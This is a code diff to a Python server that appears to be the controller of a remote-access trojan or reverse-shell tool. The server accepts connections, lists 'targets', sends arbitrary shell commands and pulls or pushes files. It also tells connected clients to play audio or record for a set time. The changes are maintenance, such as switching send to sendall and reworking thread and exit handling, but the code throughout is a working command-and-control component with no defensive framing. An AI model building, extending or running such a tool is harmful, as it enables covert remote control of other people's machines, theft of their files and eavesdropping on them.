@@ -69,7 +69,7 @@ class Server:
 				break
 			elif re.fullmatch("download [\w.]+",command.strip())!=None:
 				filename = re.fullmatch("download ([\w.]+)",command.strip()).group(1)
-				conn.send( str.encode( "-send_file {}".format(filename), "utf-8" ) ) #send triger
+				conn.sendall( str.encode( "-send_file {}".format(filename), "utf-8" ) ) #send triger
 				client_reponse = str( conn.recv(1024), "utf-8" ).split("|")
 				if client_reponse[0]=="file_found":
 					print("File {} Exists".format(filename))
@@ -87,7 +87,7 @@ class Server:
 
 			elif re.fullmatch("play [\w.:]+",command.strip())!=None:
 				filename = re.fullmatch("play ([\w.:]+)",command.strip()).group(1)
-				conn.send( str.encode("-play {}".format(filename)) )
+				conn.sendall( str.encode("-play {}".format(filename)) )
 				client_reponse = str( conn.recv(20480), 'utf-8' )
 				if client_reponse=="playing":
 					print("Playing...")
@@ -97,7 +97,7 @@ class Server:
 				print(client_reponse, end="")
 			elif re.fullmatch("record [1-9]\d*",command.strip())!=None:
 				duration = re.fullmatch("record ([1-9]\d*)",command.strip()).group(1)
-				conn.send( str.encode("-record {}".format(duration)) )
+				conn.sendall( str.encode("-record {}".format(duration)) )
 				client_reponse = str( conn.recv(20480), 'utf-8' )
 				if client_reponse=="recording":
 					print("Recording...")
@@ -107,8 +107,8 @@ class Server:
 				print(client_reponse, end="")
 
 			elif len(str.encode(command)) > 0:
-				conn.send( str.encode(command) )
-				client_reponse = str( conn.recv(20480), "utf-8" )
+				conn.sendall( str.encode(command) )
+				client_reponse = str( conn.recv(204800), "utf-8" )
 				print(client_reponse, end="")
 			# except:
 				# print("Error sending commands")
@@ -133,7 +133,7 @@ def RecvFile(conn,chunk_size=404800):
 	file_size = str(file_size,"utf-8")[:-1:]
 	if file_size.isnumeric():
 		file_size = int(file_size) 
-		conn.send( str.encode("OK") )
+		conn.sendall( str.encode("OK") )
 	else:
 		return False
 
@@ -145,7 +145,7 @@ def RecvFile(conn,chunk_size=404800):
 		response = conn.recv( chunk_size if chunk_size < remaining_data else remaining_data )
 		while response:
 			data_received += response
-			conn.send( str.encode("OK","utf-8") )
+			conn.sendall( str.encode("OK","utf-8") )
 			total_width = 20
 			prercentage_completed = ( len(data_received)/file_size)*100
 			completed_width = math.ceil( (total_width*prercentage_completed)/100 )
@@ -170,7 +170,7 @@ def SendFile(conn,file,chunk_size=404800):
 	data_sended = 0
 	print("Sending a {:0.2f} MB file...\n".format( (total_size/1024)/1024 ) )
 	
-	conn.send( str.encode( str(total_size)+"C", "utf-8" ) ) # Send Size of File to Client
+	conn.sendall( str.encode( str(total_size)+"C", "utf-8" ) ) # Send Size of File to Client
 	try:
 		response = conn.recv(2)
 		if str(response,"utf-8")!="OK":
@@ -185,7 +185,7 @@ def SendFile(conn,file,chunk_size=404800):
 		return False
 
 	while data:
-		conn.send( data )
+		conn.sendall( data )
 		reponse = conn.recv(2)
 		try:
 			if str(reponse,"utf-8")=="OK":
@@ -214,7 +214,7 @@ def list_connections():
 	active_clients = []
 	for i,conn in enumerate(ALL_CONNECTIONS):
 		try:
-			conn[0].send(str.encode("  "))
+			conn[0].sendall(str.encode("  "))
 			conn[0].recv(201480)
 		except:
 			del ALL_CONNECTIONS[i] #delete inactive clients
@@ -239,8 +239,10 @@ def get_target(cmd):
 
 def create_worker():
 	global NUMBER_OF_THREADS
+	global THREADS
 	for _ in range(NUMBER_OF_THREADS):
 		t = Thread(target=work)
+		THREADS.append(t)
 		t.daemon = True
 		t.start()
 
@@ -252,7 +254,8 @@ def work():
 			server = Server(port=x[1])
 			server.start()
 		else:
-			start_shell()
+			if(start_shell()):
+				exit()
 
 	JOB_QUEUE.task_done()
 
@@ -261,7 +264,6 @@ def create_job():
 	for x in JOB_NUMBER:
 		JOB_QUEUE.put(x)
 
-	JOB_QUEUE.join()
 	
 def start_shell():
 	global FILES_ROOT_PATH
@@ -280,10 +282,11 @@ def start_shell():
 				target = get_target( int( re.fullmatch("\s*(\d)\s*",selected_conn).group(1) ) - 1 )
 				if target:
 					conn, address = target
+					print("==> ", FILES_ROOT_PATH + '/' + filename);
 					if os.path.isfile(FILES_ROOT_PATH + "/" + filename):
 						with open(FILES_ROOT_PATH + "/" + filename,"rb") as file:
 							# Send a msg so that client start receiving
-							conn.send( str.encode( "-recv_file {}".format(filename) ,"utf-8") )
+							conn.sendall( str.encode( "-recv_file {}".format(filename) ,"utf-8") )
 							SendFile(conn,file)
 							
 					else:
@@ -302,19 +305,24 @@ def start_shell():
 				Server.send_target_commands(conn)
 			else:
 				print("Invalid Selection")
+		elif cmd=='exit':
+			return exit()
 		else:
 			print("Invalid Command")
 
 
 if __name__=="__main__":
+	THREADS = []
 	NUMBER_OF_THREADS = 2
-	JOB_NUMBER = [(1,2307),2]
+	JOB_NUMBER = [(1,2307)]
 	# JOB_NUMBER = [(1,2307),(1,2308),(1,2309),2]
 	JOB_QUEUE = Queue()
 	ALL_CONNECTIONS = []
 	FILES_ROOT_PATH = "files"
 	create_worker()
 	create_job() 
-
+	for conn in ALL_CONNECTIONS:
+		conn.close()
+	start_shell()
 
 
